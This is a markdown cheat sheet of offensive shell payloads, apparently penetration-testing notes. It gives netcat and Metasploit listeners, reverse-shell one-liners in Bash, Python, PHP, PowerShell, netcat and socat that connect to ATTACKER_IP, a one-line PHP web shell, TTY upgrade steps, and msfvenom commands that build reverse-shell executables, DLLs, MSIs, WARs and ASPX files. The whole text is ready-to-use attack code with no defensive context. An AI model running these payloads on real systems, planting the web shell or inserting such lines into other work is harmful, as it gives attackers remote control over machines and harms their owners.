# Shells & Payloads

## Listeners

```bash
nc -nlvp 443
pwncat-cs -lp 443

# Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0; set LPORT 443; run
```

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### Python
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Netcat (no -e)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f
```

### Socat
```bash
socat tcp-connect:ATTACKER_IP:443 exec:/bin/bash,pty,stderr,setsid,sigint,sane
# Listener for full TTY:
socat file:`tty`,raw,echo=0 tcp-listen:443
```

## Web Shells

```php
<?php system($_GET['cmd']); ?>
```

## Shell Upgrade (Linux)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 columns 116
```

## Msfvenom

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Windows DLL / MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o shell.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o shell.msi

# PHP / WAR / ASPX
msfvenom -p php/reverse_php LHOST=IP LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f aspx -o shell.aspx
```
